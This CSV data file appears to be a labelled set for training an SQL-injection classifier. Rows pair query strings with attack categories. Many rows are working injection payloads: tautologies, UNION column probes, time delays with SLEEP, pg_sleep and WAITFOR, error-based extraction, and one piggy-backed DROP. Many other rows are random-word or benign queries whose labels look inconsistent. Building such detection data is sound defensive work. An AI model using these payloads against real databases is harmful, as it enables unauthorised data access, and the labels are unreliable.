knownpatterns,category
1' where 8128  =  8128,Tautology
1   )    )    as rcbz where 4563  =  4563 and 2006  =  2006,Tautology
1'  )   where 4298  =  4298,Tautology
"""   SELECT COUNT ( especially ) , crew FROM soldier BY height""",Illegal/Logically incorrect query
"""elt  (  5098  =  2728  )  """,Tautology
SLEEP(5)--,Time-based Query
SELECT * FROM case WHERE century NOT BETWEEN 'silk' AND 'guess',Tautology
select sleep  (  5  )  # wihl,Time-based Query
SELECT * FROM least 3 SELECT * FROM love,Tautology
"""1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'""",Illegal/Logically incorrect query
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/template-thankyou.php' ORDER BY wp_posts.post_title ASC,Tautology
SELECT TOP 50 PERCENT * FROM win SELECT * FROM stranger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stiff,Tautology
SELECT AVG ( Price ) FROM income,Illegal/Logically incorrect query
SELECT AVG ( silk ) FROM coat SELECT SUM ( band ) ,Illegal/Logically incorrect query
1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,Time-based Query
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#",Union Query
SELECT TOP 3 * FROM sense WHERE rhythm = 'average' SELECT * FROM meet,Tautology
"""select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'squj'  =  'squj""",Illegal/Logically incorrect query
"""-5863"""" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and """"gkvy""""  =  """"gkvy""",Tautology
if  (  8812  =  7896  )   select 8812 else drop function xltk--,Piggy-Backed Query
-7600' or 7684  =  3181#,Tautology
"""1"""" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   """,Tautology
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",Union Query
1%' or sleep  (  5  )   and '%'  =  ',Time-based Query
""" select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'""",Union Query
SELECT * FROM jet WHERE substance BETWEEN '1996-07-01' AND '1996-07-31',Tautology
-5327'   )    )     )   or 1606  =  6099,Tautology
"""  SELECT salmon AS sea, welcome AS [recent]  FROM instant""",Tautology
select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,Time-based Query
"""1""""   )    )    and 7533  =  7533 and    (    (   """"rnni"""" like """"rnni""",Tautology
SELECT TOP 3 * FROM traffic SELECT * FROM rock 3SELECT * FROM grew,Tautology
WHERE ProductID  =  ALL  ( SELECT ProductID FROM OrderDetails WHERE Quantity=10 ) ;,Tautology
"""1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045=1045   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --""",Union Query
"""1   )    )    as jmcp where 8624  =  8624 union all select null,null,null,null,null,null,null,null,null,null--""",Union Query
"""1""""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --""",Time-based Query
"""INSERT INTO parts ( shake, mouse, crew, birthday, surrounded, bark )  VALUES  ( 'length', 'enemy'. kept', 'truth', 'smoke', 'could', 'about' )  """,Alternate Encoding
SELECT time FROM flies,Tautology
"""SELECT * FROM easily WHERE kind BETWEEN """"sunlight"""" AND    """"till""""""",Tautology
SELECT * FROM powerful WHERE melted BETWEEN 'dinner' AND 'topic',Tautology
SELECT * FROM reader WHERE will = 'boat'  AND  ( bare = 'vote' OR no = 'continued' ) ,Tautology
"""1%""""   )    )     )   union all select null,null,null,null--""",Union Query
SELECT * FROM this ORDER BY article DESC,Tautology
SELECT * FROM stiff WHERE NOT spin = 'can'  AND NOT clean = 'meant',Tautology
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,Tautology
""" select * from users where id=1 or """".@"""" or 1=1-- 1""""",Tautology
SELECT * FROM straw WHERE officer BETWEEN official09/01/1996since AND getting15/31/1996fell,Tautology
SELECT * FROM volume WHERE who = 'paint'  AND  ( good = 'discover' OR bigger = 'tired' ) ,Alternate Encoding
SELECT TOP 3 * FROM danger WHERE rocky = 'better',Tautology
""" select * from users where id=1 or 1#"""".=1 union select 1,version  (    )   -- 1""",Union Query
"""1 where 1186=1186 union all select null,null,null,null,null,null,null#""",Union Query
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- ",Union Query
SELECT * FROM energy WHERE alive = 'arm'  OR cross = 'track',Tautology
"""1',iif  (  7475  =  7475/0  )  """,Tautology
"""select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #""",Tautology
SELECT * FROM  ( SELECT excited FROM principle ) ,Tautology
1 where 6365  =  6365,Tautology
SELECT * FROM variety WHERE social = 'business'  OR fur = 'highest',Tautology
DELETE FROM rush,Tautology
"""-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#""",Union Query
SELECT * FROM passage WHERE closely = 'special' LIMIT 3,Tautology
"""1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  """,Alternate Encoding
-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,Tautology
"""-6520%""""  )   order by 1#""",Tautology
"""   SELECT Employees.furniture, COUNT ( Orders.otherID )  AS wellFROM    ( OrdersINNER JOIN judge ON Orders.spokenID  =  Employees.scienceID ) """,Illegal/Logically incorrect query
DELETE FROM silence,Tautology
SELECT * FROM seven WHERE put BETWEEN 'constantly' AND 'effort',Tautology
; begin declare @var varchar(8000) set @var=' ...,Alternate Encoding
"""1""""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
SELECT ask ( s )  FROM official UNION,Union Query
"""1""""   )    )    as vgsb where 4747  =  4747""",Tautology
SELECT * FROM bill WHERE cover NOT LIKE 'industry%',Tautology
SELECT COUNT ( chickenID ) FROM mile,Illegal/Logically incorrect query
1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,Time-based Query
1'+  (  select 'dpun' where 4760  =  4760,Tautology
 )   or   (  'a'  =  'a,Tautology
"select * from users where id=1 or !<@ or 1=1-- 1""",Tautology
SELECT COUNT ( DISTINCT lead )  FROM state,Illegal/Logically incorrect query
"""-7584' union all select 1132132132132132132132132132132#""",Union Query
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",Time-based Query
"""call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )  -- rucf""",Illegal/Logically incorrect query
SELECT TOP 3 * FROM breeze SELECT * FROM attached 3SELECT * FROM additional,Tautology
1' and sleep  (  5  )  #,Time-based Query
*',Tautology
SELECT * FROM struck WHERE at = 'dance',Tautology
"and 0=benchmark(3000000,MD5(1))%20--",Tautology
""" select sleep  (  5  )   and   (  """"zsjw"""" like """"zsjw""",Time-based Query
"""1%""""   )    )    or 4411=    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   """"%""""  =  """"""",Illegal/Logically incorrect query
SELECT TOP 50 PERCENT * FROM same SELECT * FROM love FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wood,Tautology
"""- 1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv""",Tautology
SELECT * FROM entire WHERE chair NOT LIKE 'blanket%',Tautology
1  )   as mpnj where 5049  =  5049,Tautology
waitfor delay '0:0:5' and   (  '%'  =  ',Time-based Query
1'  )   as gogu where 4338  =  4338 union all select null#,Union Query
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,Time-based Query
"""  SELECT * FROM extra WHERE same NOT IN  ( 'recall', 'practical', 'best' )  """,Tautology
"""- 1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#""",Union Query
"""1%"""" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and """"%""""  =  """"""",Tautology
"""1""""   )    )    and updatexml  (  3393,concat  (  0x2ex7171706a71,  (  select   (  elt  (  3393  =  3393   )    )     )  x717a767a71  )  161  )   and    (    (   """"uquh""""  =  """"uquh""",Alternate Encoding
""" select * from users where id=1 or \<\ union select 1,@@VERSION -- 1""",Union Query
1'||  (  select 'pmpd' where 9803  =  9803,Tautology
"""1  )   where 3915  =  3915 union all select null,null,null,null#""",Union Query
"""1  )   as rsyw where 4857  =  4857 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --""",Alternate Encoding
SELECT TOP 3 * FROM growth SELECT * FROM catch 3SELECT * FROM mainly,Tautology
"""1""""  )   where 5870  =  5870 union all select null,null,null--""",Union Query
"""   SELECT Employees.phrase, COUNT ( Orders.halfwayID )  AS roadFROM    ( OrdersINNER JOIN wonderful ON Orders.productID  =  Employees.girlID ) """,Illegal/Logically incorrect query
SELECT * FROM door WHERE one BETWEEN '1996-07-01' AND '1996-07-31',Tautology
"""1"""" where 7022  =  7022""",Tautology
"""   SELECT brought, worth, lady FROM stand WHERE current  IS NULL""",Tautology
"""1"""" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
-9178'  )   or 9779  =  6351,Tautology
SELECT night ( s )  FROM notice UNION,Union Query
"""-4528""""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  """"fxmt"""" like """"fxmt""",Tautology
1'+  (  select idnb where 2338  =  2338,Tautology
SELECT below ( s )  FROM station SELECT thank FROM knowledge,Tautology
"""  SELECT back AS himself, sand AS [clay]  FROM shelter""",Tautology
"""select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  """"ymss""""  =  """"ymss""",Illegal/Logically incorrect query
"""-2423'   )    )     )   union all select 8256,8256,8256,8256,8256,8256,8256,8256--""",Union Query
""" end and """"xlvn""""  =  """"xlvn""",Tautology
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367584 ) ,Tautology
"""call regexp_substring  (  repeat  (  right  (  char  (  3702  )    )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348""",Illegal/Logically incorrect query
-2817%'  )   or 8255  =  3841--,Tautology
"""1%""""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #""",Alternate Encoding
"""   SELECT enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold AS value  FROM stick""",Tautology
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_custom_fields_update' LIMIT 1,Tautology
""" SELECT column_name ( s )  FROM garden,bone""",Tautology
"""iif  (  3204  =  8489,3204/0  )  """,Tautology
"""SELECT SUBDATE ( """"2017-06- 15 09:34:21"""", INTERVAL 15 MINUTE ) ;""",Illegal/Logically incorrect query
"""  SELECT necessaryID AS ID, taste AS voice FROM house""",Tautology
- 1217'   )    )     )   order by 1#,Tautology
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",Union Query
SELECT * FROM  ( SELECT anybody FROM lying ) ,Tautology
SELECT * FROM receive WHERE Price NOT BETWEEN 10 AND 20,Tautology
1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',Time-based Query
SELECT AVG ( Price ) FROM thus,Illegal/Logically incorrect query
1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,Time-based Query
"""INSERT INTO come  ( rabbit, separate, full )  VALUES  ( 'government', 'using', 'hard' )  """,Alternate Encoding
-3107'  )   where 7782  =  7782 or 8571=  8571--,Tautology
"""1 and updatexml  (  3393,concat  (  0x2ex7171706a71,  (  select   (  elt  (  3393  =  3393   )    )     )  x717a767a71  )  161  )  -- mwsm""",Alternate Encoding
"""  SELECT * FROM balloon WHERE process NOT IN  ( 'orbit', 'huge', 'stick' )  """,Tautology
SELECT * FROM lion WHERE cell = 'arrow' LIMIT 3,Tautology
DELETE FROM shut,Tautology
SELECT describe ( s )  FROM hay FULL OUTER JOIN,Tautology
"""1'+  (  select 'mxei' where 7811=  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
"""1""""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  """"zgoy"""" like """"zgoy""",Time-based Query
ORDER BY 26#,Tautology
SELECT * FROM slide 3 SELECT * FROM rope,Tautology
SELECT * FROM barn WHERE sheet NOT BETWEEN 'century' AND 'health',Tautology
"""1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca""",Tautology
SELECT * FROM build ORDER BY plenty DESC,Tautology
SELECT * FROM feature  WHERE it NOT LIKE '[our]%',Tautology
"""1',  (  select   (  case when   (  7711=  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )   """,Alternate Encoding
SELECT COUNT ( rope ) FROM exercise,Illegal/Logically incorrect query
"""-8538"""" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  """,Alternate Encoding
"""  SELECT longID AS ID, sides AS audience FROM cutting""",Tautology
SELECT * FROM women WHERE bowl = 'near'  OR sea = 'ship',Tautology
1'  )   where 1502=1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,Tautology
1' where 9206  =  9206,Tautology
SELECT power ( s )  FROM instant,Tautology
"""1%""""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )    )  ,5000000000  )  ,null  )   and    (    (   """"%""""  =  """"""",Illegal/Logically incorrect query
"""1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
WHERE ProductID  =  ANY  ( SELECT   ProductID FROM OrderDetails WHERE Quantity=10 ) ;,Tautology
"""-3321"""" where 1603=1603 union all select 1603603603603#""",Union Query
"""1'+  (  select pxrg where 5589  =  5589 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
1  )   order by 1#,Tautology
 UPDATE practical SET hang = 'fellow'WHERE carried = 'mark',Tautology
SELECT * FROM chart,Alternate Encoding
SELECT size ( s ) FROM skill INNER JOIN,Tautology
"""1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '""",Tautology
"""1%"""" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and """"%""""  =  """"""",Tautology
"""  SELECT Orders.circlerID, Employees.diameter, Employees.automobile FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shoulderID ORDER BY Orders.shallID""",Tautology
"""1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270   )    )     )  x717a767a71x78   )    )   x   )    )   """,Alternate Encoding
SELECT AVG ( comfortable ) FROM health,Illegal/Logically incorrect query
"""1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
1' and non_existant_table   =   '1,Tautology
select   (  case when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --,Tautology
SELECT lady ( s )  FROM swung,Tautology
"""1""""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )  --""",Illegal/Logically incorrect query
"""-4670""""   )    )    or 3038  =  3038""",Tautology
 ORDER BY 9-- ,Tautology
"""1' union all select null,null,null,null,null#""",Union Query
"""-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#""",Union Query
1'  )   where 2090  =  2090,Tautology
"""1""""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  """"btht""""  =  """"btht""",Time-based Query
SELECT * FROM fed WHERE lion = 'cowboy' LIMIT 3,Tautology
"""1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw""",Tautology
"""1""""  )   where 2570  =  2570 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,Alternate Encoding
DELETE FROM section WHERE underline = 'shoot',Tautology
SELECT interest FROM men,Alternate Encoding
SELECT TOP 50 PERCENT * FROM remarkable SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM those,Tautology
SELECT * FROM front,Tautology
"""1'+  (  select 'qrml' where 3791=  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'""",Tautology
FROM  ( SELECT DISTINCT terrible FROM roar ) ,Tautology
SELECT TOP 3 * FROM coal,Tautology
SELECT * FROM note 3,Tautology
"""1""""  )   where 5196  =  5196 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --""",Tautology
SELECT AVG ( driving ) FROM forest SELECT SUM ( atomic ) ,Illegal/Logically incorrect query
"""1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   """,Tautology
"""1'  )   union all select null,null,null--""",Union Query
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",Union Query
SELECT * FROM law ORDER BY line DESC,Tautology
SELECT AVG ( sign ) FROM check SELECT SUM ( large ) ,Illegal/Logically incorrect query
SELECT TOP 3 * FROM easily WHERE unless = 'percent',Tautology
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",Union Query
"""1' and elt  (  4249  =  4249,7259  )   and 'pgvz'  =  'pgvz""",Tautology
SELECT * FROM move 3,Tautology
SELECT TOP 50 PERCENT * FROM settle SELECT * FROM blank FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM somehow,Tautology
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",Union Query
select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,Alternate Encoding
1'   )    )    as njop where 7001=  7001,Tautology
"""1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh""",Tautology
SELECT * FROM  ( SELECT bet FROM orange ) ,Tautology
SELECT * FROM sick FETCH FIRST 3 ROWS ONLY,Tautology
SELECT * FROM standard WHERE parts BETWEEN 'bark' AND 'beauty',Tautology
select   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  select 2294 from information_schema.character_sets  )   end  )  #,Alternate Encoding
"""1 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
SELECT TOP 3 * FROM people WHERE sheep = 'tube' SELECT * FROM enemy,Tautology
SELECT * FROM environment WHERE Price NOT BETWEEN 10 AND 20,Tautology
1'+  (  select 'cwta' where 6091=  6091,Tautology
SELECT flight ( s )  FROM means UNION ALL,Union Query
SELECT characteristic ( s )  FROM hello,Alternate Encoding
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",Union Query
SELECT * FROM car WHERE substance BETWEEN '1996-07-01' AND '1996-07-31',Tautology
   )    )   ;waitfor delay '0:0:__TIME__'--,Time-based Query
SELECT AVG ( public ) FROM to,Illegal/Logically incorrect query
"""1""""   )    )    as sdlv where 5922  =  5922 and 2006  =  2006""",Tautology
"""call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )   and """"rbqs""""  =  """"rbqs""",Illegal/Logically incorrect query
SELECT * FROM spider WHERE    NOT vessels = 'oxygen',Tautology
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,Alternate Encoding
"""1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
"""1"""" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and """"mynm"""" like """"mynm""",Alternate Encoding
SELECT * FROM point,Alternate Encoding
"""1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )    )  ,5000000000  )  ,null  )  #""",Illegal/Logically incorrect query
1' ORDER BY 1--+,Tautology
"""- 1844'  )   union all select 9572,9572,9572,9572#""",Union Query
SELECT * FROM torn  WHERE zoo NOT LIKE '[dead]%',Tautology
1'+  (  select ejaj where 1651=1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',Time-based Query
"""1%""""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270   )    )     )  x717a767a71x78   )    )   x   )    )    and    (    (     (  """"%""""  =  """"""",Alternate Encoding
 or 0=0 #,Tautology
"""  SELECT mistake,fish,close FROM plates LEFT JOIN Orders ON meet.forgottenID =  worried.attention ORDER BY angle.rocket""",Tautology
SELECT * FROM stone 3 SELECT * FROM wall,Tautology
-7675%'   )    )     )   order by 1--,Tautology
1'   )    )    as vrwr where 3830  =  3830,Tautology
SELECT COUNT ( simplestID ) FROM here,Illegal/Logically incorrect query
"""1' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
SELECT COUNT ( positive ) FROM nice,Illegal/Logically incorrect query
SELECT * FROM social WHERE run BETWEEN '1996-07-01' AND '1996-07-31',Tautology
"""1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #""",Alternate Encoding
"""  SELECT partly,field FROM slide WHERE why = 'country' UNION SELECT no, replace FROM youth""",Union Query
SELECT * FROM tales WHERE mark = 'curious'  OR out = 'damage',Tautology
SELECT * FROM noise ORDER BY president DESC,Tautology
"""iif  (  7036  =  2370/0  )  """,Tautology
1'  )   where 5287  =  5287 and 7533  =  7533--,Tautology
"select * from users where id=1 <@<@ or 1=1-- 1""",Tautology
SELECT * FROM progress WHERE instrument = 'crack'  AND  ( freedom = 'something' OR pass = 'am' ) ,Tautology
"""1%""""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   """"%""""  =  """"""",Illegal/Logically incorrect query
"""  SELECT factID AS ID, manufacturing AS weak FROM round""",Tautology
SELECT * FROM sink  WHERE steel = now,Tautology
"""1""""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --""",Alternate Encoding
"""1'||  (  select 'dukt' where 3206  =  3206 or 4411=    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'""",Illegal/Logically incorrect query
"""1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270   )    )     )  x717a767a71x78   )    )   x   )    )    and   (  'thce'  =  'thce""",Alternate Encoding
SELECT city ( s )  FROM involved FULL OUTER JOIN,Tautology
"""1"""" union all select null,null,null,null--""",Union Query
